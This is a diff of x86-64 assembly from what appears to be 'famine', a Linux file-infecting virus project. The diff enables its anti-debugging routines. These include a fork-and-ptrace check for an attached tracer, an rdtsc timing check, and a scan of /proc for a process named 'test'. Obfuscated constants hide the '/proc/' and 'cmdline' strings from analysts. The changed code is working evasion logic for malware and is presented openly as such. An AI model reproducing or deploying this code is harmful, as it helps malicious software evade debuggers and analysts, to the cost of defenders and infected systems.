@@ -17,7 +17,6 @@ _famine:
 ; It play arround with register and replace the top of the st
 ; ack so the ret will jump where we want
 ;-------------------------------------------------------------
-
 obfu:
     push rax
     push rcx
@@ -108,7 +107,7 @@ db 0xD9 ; SIB following MOD-REG-R/M
 ;-------------------------------------------------------------
 ;----------------->ANTI DEBUGGING techniques<-----------------
 ;-------------------------------------------------------------
-; - PTRACE
+; - Fork and checking if current process is traced
 ; - time elapsed between 2 block of codes
 ; - If specific process is running, in our case ('test')
 ;-------------------------------------------------------------
@@ -118,20 +117,36 @@ begin:
     sub rsp, FILE_SIZE + DIRENT + FSTAT + ENTRY + MAPPED_FILE
 
 ; ; ANTI DEBUG 2
-;     rdtsc                           ; get timestamp (EDX(high) - EAX(low))
-;     mov dword [rsp + 124], eax 
+    rdtsc                           ; get timestamp (EDX(high) - EAX(low))
+    mov dword [rsp + 124], eax 
+
+;-------------------------------------------------------------
+; Fork and check if we're the tracers
+;-------------------------------------------------------------
 
 next:
-    xor rdi, rdi                    ; PTRACE_TRACEME
-; We do not need to set the other parameters as specified in man
-; ptrace they will be ignored if PTRACE_TRACEME.
-    mov rax, SYS_PTRACE
-    ; xor rsi, rsi
-    ; xor r10, r10
-    ; xor rdx, rdx
+    ; fork
+    mov rax, 57
     syscall
     cmp rax, 0
-    jge anti_process
+    je child
+;-------------------------------------------------------------
+; Parent wait for status from child
+; if WEXITSTATUS == 1, that's mean we're not the tracer
+;-------------------------------------------------------------
+
+    mov rdi, rax
+    lea rax, [rsp]
+    mov rsi, rax
+    mov rdx, 0
+    mov r10, 0
+    mov rax, 61
+    syscall
+    mov eax, dword [rsp]
+    and eax, 65280
+    sar eax, 8
+    cmp eax, 1
+    jne anti_process
 
 ; -------------------------------------------------------------
 ; This will print a msg and exit when debugging.
@@ -169,160 +184,212 @@ next:
     mov rdx, 13
     mov rax, SYS_WRITE
     syscall
-    jmp clean
+    mov rax, SYS_EXIT
+    mov rdi, 1
+    syscall
 
+;-------------------------------------------------------------
+; Child code
+;-------------------------------------------------------------
+child:
+; ptrace(PTRACE_ATTACH, ppid, 0 0);
+; if attach is successful the traced process has to be continued
+    mov rax, 110
+    syscall
+    mov rdi, 16
+    mov rsi, rax
+    mov rdx, 0
+    mov r10, 0
+    mov rax, SYS_PTRACE
+    syscall
+    test rax, rax
+    jns child_wait
+; We're not the tracee exit
+    mov rdi, 1
+    mov rax, SYS_EXIT
+    syscall
+; Resume the traced process
+child_wait:
+    mov rax, 110
+    syscall
+; waitpid(ppid, 0, 0)
+    mov rdi, rax
+    mov rsi, 0
+    mov rdx, 0
+    mov r10, 0
+    mov rax, 61
+    syscall
+; ptrace(PTRACE_CONT, ppid, 0, 0)
+    mov rdi, 7
+    xor rsi, rsi
+    xor rdx, rdx
+    xor r10, r10
+    mov rax, SYS_PTRACE
+    syscall
+    mov rax, 110
+    syscall
+; ptrace(PTRACE_DETACH, ppid, 0, 0)
+    mov rdi, 17
+    mov rsi, rax
+    xor rdx, rdx
+    xor r10, r10
+    mov rax, SYS_PTRACE
+    syscall
+; child exit
+    mov rdi, 0
+    mov rax, SYS_EXIT
+    syscall
 ;-------------------------------------------------------------
 ; Search in `/proc/` dir a process with name `test` in
 ; the cmdline file.
 ;-------------------------------------------------------------
-
 anti_process:
-; ; little obfuscation to prevent literal strings in analysis
-;     mov rcx, 0x252345603525
-;     mov rax, 0x0a402a123b0a
-;     add rax, rcx        
-;     mov [rsp], rax              ; rax = '/proc/'
-;     lea rdi, [rsp]
-;     xor rdx, rdx                ; O_RDONLY
-;     mov rax, SYS_OPEN
-;     syscall
-;     cmp rax, 0
-;     jl clean
-;     mov r14b, al
-; ;-------------------------------------------------------------
-; ; Allocate an arbitry size to use for getdents
-; ; mmap(void *addr, size_t len, int prot, int flags, int fd, off_t offset);
-; ;-------------------------------------------------------------
-;     xor rdi, rdi                ; 0
-;     mov rsi, 0x10000            ; arbitry.
-;     mov rdx, 0x3                ; PROT_READ | PROT_WRITE
-;     mov r10, 34                 ; MAP_PRIVATE | MAP_ANON
-;     mov r8, -1
-;     mov r9, 0
-;     mov rax, 9
-;     syscall
-;     mov [rsp + 32], rax
-;     ; mov [rsp + 40], word 0
-; ;-------------------------------------------------------------
-; ; ssize_t getdents64(int fd, void *dirp, size_t count);
-; ;-------------------------------------------------------------
-;     mov rsi, [rsp + 32]
-;     movzx rdi, r14b
-;     mov rax, SYS_GETDENTS
-;     mov rdx, 0x10000
-;     syscall
-;     cmp rax, 0
-;     jl clean_anti_process
-; ;-------------------------------------------------------------
-; ; Iterate over each entries, search for folder with an integer
-; ; as first character, if found read the `cmdline` file and che
-; ; ck if the last 5 bytes is equal to '/test'.
-; ;-------------------------------------------------------------
-;     mov rcx, rax                                    ; COUNT
-;     mov rdx, [rsp + 32]
-;     xor r15, r15                                    ;
-;     .search_pid:
-;         cmp rcx, r15
-;         je  clean_anti_process
-;         mov [rsp + 72], rdx
-;         mov [rsp + 80], rcx
-;         cmp byte [rdx + LDIRENT_64.d_type], 0x4     ; DT_DIR
-;         jne .inc
-;         cmp byte [rdx + LDIRENT_64.d_name], 0x30    ; '0'
-;         jl .inc
-;         cmp byte [rdx + LDIRENT_64.d_name], 0x39    ; '9'
-;         jg .inc
+; little obfuscation to prevent literal strings in analysis
+    mov rcx, 0x252345603525
+    mov rax, 0x0a402a123b0a
+    add rax, rcx        
+    mov [rsp], rax              ; rax = '/proc/'
+    lea rdi, [rsp]
+    mov rsi, 0x10800            ; O_RDONLY | O_DIRECTORY
+    mov rax, SYS_OPEN
+    syscall
+    cmp rax, 0
+    jl clean
+    mov r14b, al
+;-------------------------------------------------------------
+; Allocate an arbitry size to use for getdents
+; mmap(void *addr, size_t len, int prot, int flags, int fd, off_t offset);
+;-------------------------------------------------------------
+    xor rdi, rdi                ; 0
+    mov rsi, 0x10000            ; arbitry.
+    mov rdx, 0x3                ; PROT_READ | PROT_WRITE
+    mov r10, 34                 ; MAP_PRIVATE | MAP_ANON
+    mov r8, -1
+    mov r9, 0
+    mov rax, 9
+    syscall
+    mov [rsp + 32], rax
+    ; mov [rsp + 40], word 0
+;-------------------------------------------------------------
+; ssize_t getdents64(int fd, void *dirp, size_t count);
+;-------------------------------------------------------------
+    mov rsi, [rsp + 32]
+    movzx rdi, r14b
+    mov rax, SYS_GETDENTS
+    mov rdx, 0x10000
+    syscall
+    cmp rax, 0
+    jl clean_anti_process
+;-------------------------------------------------------------
+; Iterate over each entries, search for folder with an integer
+; as first character, if found read the `cmdline` file and che
+; ck if the last 5 bytes is equal to '/test'.
+;-------------------------------------------------------------
+    mov rcx, rax                                    ; COUNT
+    mov rdx, [rsp + 32]
+    xor r15, r15                                    ;
+    .search_pid:
+        cmp rcx, r15
+        je  clean_anti_process
+        mov [rsp + 72], rdx
+        mov [rsp + 80], rcx
+        cmp byte [rdx + LDIRENT_64.d_type], 0x4     ; DT_DIR
+        jne .inc
+        cmp byte [rdx + LDIRENT_64.d_name], 0x30    ; '0'
+        jl .inc
+        cmp byte [rdx + LDIRENT_64.d_name], 0x39    ; '9'
+        jg .inc
 
-;     mov rax, [rdx + LDIRENT_64.d_name]
-;     mov [rsp + 6], rax
-;     xor rax, rax
-; ; concat /proc/<name>
-;     .concat:
-;         cmp byte [rsp + 7 + rax], 0
-;         je .read_proc
-;         add rax, 1
-;         jmp .concat
+    mov rax, [rdx + LDIRENT_64.d_name]
+    mov [rsp + 6], rax
+    xor rax, rax
+; concat /proc/<name>
+    .concat:
+        cmp byte [rsp + 7 + rax], 0
+        je .read_proc
+        add rax, 1
+        jmp .concat
 
-;     .read_proc:
-; ; Obfuscation for literal string
-;         mov rdx, 0x415f3141322f221f
-;         mov rsi, 0x240f382b323e4110
-;         add rdx, rsi
-;         mov [rsp + 7 + rax], rdx
-;         lea rdi, [rsp]
-;         mov rsi, 0x0
-;         mov rdx, 0
-;         mov rax, SYS_OPEN
-;         syscall
-;         cmp rax, 0
-;         jl .inc
-;         mov r8, rax
-;         mov rdi, rax
-;         lea rsi, [rsp + 42]
-;         mov rdx, 30           ; read 30
-;         mov rax, SYS_READ
-;         syscall
-;         cmp rax, 5            ; atleast 5 bytes
-;         jl .cleanup_fd
-;         mov rcx, 5
-;         lea rdi, [rsp + 42]
-; ;-------------------------------------------------------------
-; ; There we jump to buffer[len - 6]  to compare the last 6 bytes
-; ;-------------------------------------------------------------
-;         sub rax, 6  
-;         add rdi, rax
-;         mov rax, 0x00747365742f
-;         mov [rsp + 24], rax
-;         lea rsi, [rsp + 24]
-;         cld
-; ; Compare both strings
-;         repe cmpsb
-;         je proc_found
-;     .cleanup_fd:
-;         mov rdi, r8
-;         mov rax, SYS_CLOSE
-;         syscall
-;     .inc:
-;         mov rdx, [rsp + 72]
-;         mov rcx, [rsp + 80]
-;         movzx rax, word [rdx + LDIRENT_64.d_reclen]
-;         add r15, rax
-;         add rdx, rax
-;         jmp .search_pid
+    .read_proc:
+; Obfuscation for literal string
+        mov rdx, 0x415f3141322f221f
+        mov rsi, 0x240f382b323e4110
+        add rdx, rsi
+        mov [rsp + 7 + rax], rdx
+        lea rdi, [rsp]
+        mov rsi, 0x0
+        mov rdx, 0
+        mov rax, SYS_OPEN
+        syscall
+        cmp rax, 0
+        jl .inc
+        mov r8, rax
+        mov rdi, rax
+        lea rsi, [rsp + 42]
+        mov rdx, 30           ; read 30
+        mov rax, SYS_READ
+        syscall
+        cmp rax, 5            ; atleast 5 bytes
+        jl .cleanup_fd
+        mov rcx, 5
+        lea rdi, [rsp + 42]
+;-------------------------------------------------------------
+; There we jump to buffer[len - 6]  to compare the last 6 bytes
+;-------------------------------------------------------------
+        sub rax, 6  
+        add rdi, rax
+        mov rax, 0x00747365742f
+        mov [rsp + 24], rax
+        lea rsi, [rsp + 24]
+        cld
+; Compare both strings
+        repe cmpsb
+        je proc_found
+    .cleanup_fd:
+        mov rdi, r8
+        mov rax, SYS_CLOSE
+        syscall
+    .inc:
+        mov rdx, [rsp + 72]
+        mov rcx, [rsp + 80]
+        movzx rax, word [rdx + LDIRENT_64.d_reclen]
+        add r15, rax
+        add rdx, rax
+        jmp .search_pid
 
-; ;-------------------------------------------------------------
-; ; The `test` process is running, before leaving we must clean
-; ; what we use
-; ;-------------------------------------------------------------
-; proc_found:
-;     mov rdi, r8
-;     mov rax, SYS_CLOSE
-;     syscall
-;     mov [rsp + 40], word 1
+;-------------------------------------------------------------
+; The `test` process is running, before leaving we must clean
+; what we use
+;-------------------------------------------------------------
+proc_found:
+    mov rdi, r8
+    mov rax, SYS_CLOSE
+    syscall
+    mov [rsp + 40], word 1
 
-; clean_anti_process:
-;     mov rdi, r14
-;     mov rax, SYS_CLOSE
-;     syscall
-;     mov rdi, [rsp + 32]
-;     mov rsi, 0x10000
-;     mov rax, SYS_MUNMAP
-;     syscall
-;     mov ax, word [rsp + 40]
-;     cmp ax, 0
-;     jne clean
+clean_anti_process:
+    mov rdi, r14
+    mov rax, SYS_CLOSE
+    syscall
+    mov rdi, [rsp + 32]
+    mov rsi, 0x10000
+    mov rax, SYS_MUNMAP
+    syscall
+    mov ax, word [rsp + 40]
+    cmp ax, 0
+    jne clean
 
 ;-------------------------------------------------------------
 ; 'test' isnt running, we will compute time elapsed since our
 ; first rdtsc, if superior to FFF, assumes that the program
 ; is running under some sort of debugger
 ;-------------------------------------------------------------
-    ; rdtsc                       ; get another timestamp
-    ; mov ecx, dword [rsp + 124]  ; last timestamp save
-	; sub eax, ecx                ; compute elapsed ticks
-	; cmp eax, 0xFFFFF
-	; jl launch
-    ; jmp clean
+    rdtsc                       ; get another timestamp
+    mov ecx, dword [rsp + 124]  ; last timestamp save
+	sub eax, ecx                ; compute elapsed ticks
+	cmp eax, 0xFFFFF
+	jl launch
+    jmp clean
 
 ;-------------------------------------------------------------
 ;-------------------------> FAMINE <--------------------------
